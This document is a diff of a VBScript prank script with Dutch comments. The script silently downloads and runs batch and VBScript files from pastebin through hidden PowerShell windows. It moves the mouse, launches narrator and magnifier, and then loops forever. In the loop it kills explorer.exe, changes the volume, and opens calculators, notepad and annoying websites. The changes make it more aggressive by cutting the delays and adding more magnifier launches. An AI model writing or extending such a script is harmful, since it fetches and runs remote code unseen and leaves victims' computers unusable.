@@ -2,7 +2,7 @@ Set WshShell = CreateObject("WScript.Shell")
 
 ' Download en start pingyoutube.bat
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','%TEMP%\pingyoutube.bat'); Start-Process '%TEMP%\pingyoutube.bat'""", 0, False
-WScript.Sleep 1250
+WScript.Sleep 950
 
 ' Start vergrootglas
 WshShell.Run "magnify.exe", 1, False
@@ -18,14 +18,14 @@ WshShell.Run "narrator", 0, False
 
 ' Download en start relaunchping.bat
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','%TEMP%\relaunchping.bat'); Start-Process '%TEMP%\relaunchping.bat'""", 0, False
-WScript.Sleep 3000
+WScript.Sleep 1200
 
 ' Beweeg muis naar 4 hoeken (PowerShell één regel)
 moveCmd = "powershell -w hidden -command ""Add-Type -AssemblyName System.Windows.Forms; $pos=@(@{X=0;Y=0},@{X=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width;Y=0},@{X=0;Y=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height},@{X=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width;Y=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height}); foreach ($p in $pos) {[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p.X,$p.Y); Start-Sleep -Milliseconds 300}"""
 
 WshShell.Run moveCmd, 0, False
 
-WScript.Sleep 3000
+WScript.Sleep 1200
 
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','%TEMP%\mousemove.vbs'); Start-Process '%TEMP%\mousemove.vbs'""", 0, False
 
@@ -34,13 +34,14 @@ WshShell.Run "wscript.exe %TEMP%\soundloop.vbs", 0, False
 
 Do
     WshShell.Run "taskkill /f /im explorer.exe", 0, False
-    WScript.Sleep 1000
+    WScript.Sleep 300
 	WshShell.Run "powershell -command ""(New-Object -ComObject WScript.Shell).SendKeys([char]173)""", 0, False
     WshShell.Run "powershell -command ""for ($i=0; $i -lt 50; $i++) {(New-Object -ComObject WScript.Shell).SendKeys([char]175); Start-Sleep -Milliseconds 50}""", 0, False
     WshShell.Run "https://www.youtube.com/watch?v=DLzxrzFCyOs&autoplay=1", 3, False
     WshShell.Run "cmd /c start https://www.youtube.com/watch?v=DLzxrzFCyOs&autoplay=1", 0, False
 	wshShell.Run "https://theannoyingsite.com/", 3, False
     WshShell.Run "calc", 3, False
+    WshShell.Run "magnify.exe", 1, False
     WshShell.Run "notepad", 3, False
     WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1", 1, False
 	WshShell.Run "https://cat-bounce.com/", 3, False
@@ -58,6 +59,7 @@ Do
 	WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 3, False
     WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1", 1, False
     WshShell.Run "calc", 3, False
+    WshShell.Run "magnify.exe", 1, False
 	WshShell.Run "https://youareanidiot.cc/", 3, False
     WshShell.Run "notepad", 3, False
 	WshShell.Run "https://cat-bounce.com/", 3, False
@@ -111,6 +113,7 @@ Do
     WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 3, False
     WshShell.Run "calc", 3, False
     WshShell.Run "notepad", 3, False
+    WshShell.Run "magnify.exe", 1, False
 	WshShell.Run "https://cat-bounce.com/", 3, False
 	WshShell.Run "https://www.nyan.cat/", 3, False
 	WshShell.Run "https://mcdonaldshamburger.neocities.org//", 3, False    
@@ -155,6 +158,7 @@ Do
 	WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 3, False
     WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 3, False
     WshShell.Run "calc", 3, False
+    WshShell.Run "magnify.exe", 1, False
     WshShell.Run "notepad", 3, False
 	WshShell.Run "https://cat-bounce.com/", 3, False
 	WshShell.Run "https://www.nyan.cat/", 3, False
@@ -245,6 +249,7 @@ Do
 	WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 3, False
     WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 3, False
     WshShell.Run "calc", 3, False
+    WshShell.Run "magnify.exe", 1, False
     WshShell.Run "notepad", 3, False
     WshShell.Run "https://rb.gy/gttr3h", 3, False
 	WshShell.Run "https://cat-bounce.com/", 3, False
